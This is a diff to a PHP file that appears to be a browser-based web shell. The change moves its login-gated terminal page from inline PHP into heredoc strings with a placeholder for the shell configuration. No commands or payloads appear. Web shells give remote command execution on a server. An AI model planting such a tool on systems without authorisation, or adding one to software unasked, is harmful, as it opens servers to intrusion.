@@ -220,11 +220,10 @@ if (isset($_GET["feature"])) {
   initShellConfig();
 }
 
-?>
+if (isset($_SESSION["logged_in"])) {
+  $body = <<<END
 
-<?php if (isset($_SESSION["logged_in"])) { ?>
-
-  <!DOCTYPE html>
+<!DOCTYPE html>
 
   <html>
 
@@ -376,7 +375,7 @@ if (isset($_GET["feature"])) {
     </style>
 
     <script>
-      var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
+      var SHELL_CONFIG = {{SHELL_CONFIG}};
       var CWD = null;
       var commandHistory = [];
       var historyPosition = 0;
@@ -384,10 +383,10 @@ if (isset($_GET["feature"])) {
       var eShellContent = null;
 
       function _insertCommand(command) {
-        eShellContent.innerHTML += "\n\n";
+        eShellContent.innerHTML += "\\n\\n";
         eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
         eShellContent.innerHTML += escapeHtml(command);
-        eShellContent.innerHTML += "\n";
+        eShellContent.innerHTML += "\\n";
         eShellContent.scrollTop = eShellContent.scrollHeight;
       }
 
@@ -440,7 +439,7 @@ if (isset($_GET["feature"])) {
             }
           } else {
             _insertCommand(eShellCmdInput.value);
-            _insertStdout(data.files.join("\n"));
+            _insertStdout(data.files.join("\\n"));
           }
         }
 
@@ -657,10 +656,18 @@ if (isset($_GET["feature"])) {
   </body>
 
   </html>
+END;
 
-<?php
+  $body = str_replace(
+    '{{SHELL_CONFIG}}',
+    json_encode($SHELL_CONFIG),
+    $body
+  );
+
+  echo $body;
 } else {
-?>
+
+  echo <<<END
   <!DOCTYPE html>
   <html>
 
@@ -685,6 +692,5 @@ if (isset($_GET["feature"])) {
   </script>
 
   </html>
-<?php
+END;
 }
-?>
